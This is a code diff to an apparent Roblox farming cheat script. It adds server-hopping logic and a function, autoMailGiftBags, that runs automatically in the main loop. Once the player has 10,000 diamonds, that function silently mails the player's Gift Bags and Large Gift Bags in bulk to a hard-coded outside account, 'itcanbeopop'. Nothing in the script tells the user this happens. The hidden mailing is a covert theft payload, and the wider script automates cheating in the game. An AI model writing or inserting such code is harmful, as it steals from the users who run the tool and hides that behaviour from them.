@@ -137,6 +137,7 @@ function getInfo(name) return saveMod.Get()[name] end
 function getTool() return Player.Character:FindFirstChild("WEAPON_"..Player.Name, true) end
 function equipTool(toolName) return Library.Network.Invoke(toolName.."_Toggle") end
 function getCurrentZone() return Library["MapCmds"].GetCurrentZone() end
+function getDiamonds() return Player.leaderstats["💎 Diamonds"].Value end
 function sendNotif(msg)
 	local message = {content = msg}
 	local jsonMessage = HttpService:JSONEncode(message)
@@ -157,8 +158,25 @@ function getBalloonUID(zoneName)
 	end
 end
 function getServer()
-	local servers = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. tostring(game.PlaceId) .. '/servers/Public?sortOrder=Asc&limit=100')).data
-	local server = servers[Random.new():NextInteger(1, 100)]
+	local response = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. tostring(game.PlaceId) .. '/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true'))
+	local deep = math.random(1, 3)
+    for i = 1, deep, 1 do
+        if response.nextPageCursor then
+            response = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. tostring(game.PlaceId) .. '/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true&cursor=' .. tostring(response.nextPageCursor)))
+            task.wait(1)
+        else
+            break
+        end
+    end
+    local servers = {}
+    if response and response.data then
+        for i, v in next, response.data do
+            if type(v) == "table" and v.id ~= game.JobId and v.ping < 100 then
+                table.insert(servers, 1, v)
+            end
+        end
+    end
+    local server = servers[Random.new():NextInteger(1, 100)]
 	if server then return server else return getServer() end
 end
 function getPresents() for i,v in pairs(Library.Save.Get().HiddenPresents) do 
@@ -191,6 +209,30 @@ function getMyPetsEquipped()
         end
     end
     return tbl
+end
+function autoMailGiftBags()
+    if getDiamonds() >= 10000 then
+        local largeGiftBagCheckDone, smallGiftBagCheckDone
+        for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
+            if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
+            if itemTable.id == "Large Gift Bag" then
+                largeGiftBagCheckDone = true
+                if itemTable._am and itemTable._am >= 500 then
+                    repeat
+                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 500)
+                    until success
+                end
+            elseif itemTable.id == "Gift Bag" then
+                smallGiftBagCheckDone = true
+                if itemTable._am and itemTable._am >= 1000 then
+                    repeat
+                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 1000)
+                    until success
+                end
+            end
+        end
+    end
+    return true
 end
 -- AUTO ORB
 local autoOrbConnection = nil
@@ -273,8 +315,9 @@ while getgenv().MoneyPrinter.autoBalloons do task.wait()
 				end
 			end
 			if getgenv().MoneyPrinter.sendWeb then
-				sendNotif("```asciidoc\n[ "..Player.Name.." Earned ]\n‐ "..tostring(endGifts - startGifts).." Small :: "..tostring(getTotalRAP((endGifts - startGifts) * SmallRAP)).." \n‐ "..tostring(endLarge - startLarge).." Large :: "..tostring(getTotalRAP((endLarge - startLarge) * LargeRAP)).." \n\n[ Total / Server ]\n‐ "..tostring(endGifts).." Small :: "..tostring(getTotalRAP(endGifts * SmallRAP)).." \n‐ "..tostring(endLarge).." Large :: "..tostring(getTotalRAP(endLarge * LargeRAP)).." \n- took "..tostring(currentTime - startTime).." seconds \n- had "..tostring(startBalloons).." balloons\n```")
+				sendNotif("```asciidoc\n[ "..Player.Name.." Earned ]\n‐ "..tostring(endGifts - startGifts).." Small :: "..tostring(getTotalRAP((endGifts - startGifts) * SmallRAP)).." \n‐ "..tostring(endLarge - startLarge).." Large :: "..tostring(getTotalRAP((endLarge - startLarge) * LargeRAP)).." \n\n[ Total / Server ]\n‐ "..tostring(endGifts).." Small :: "..tostring(getTotalRAP(endGifts * SmallRAP)).." \n‐ "..tostring(endLarge).." Large :: "..tostring(getTotalRAP(endLarge * LargeRAP)).." \n- took "..tostring(currentTime - startTime).." seconds \n- had "..tostring(startBalloons).." balloons \n\n[ Diamonds ]\n‐ have " .. tostring(getDiamonds()) .. " diamonds```")
 			end
+            repeat task.wait() until autoMailGiftBags()
 			repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
 		end
 	end
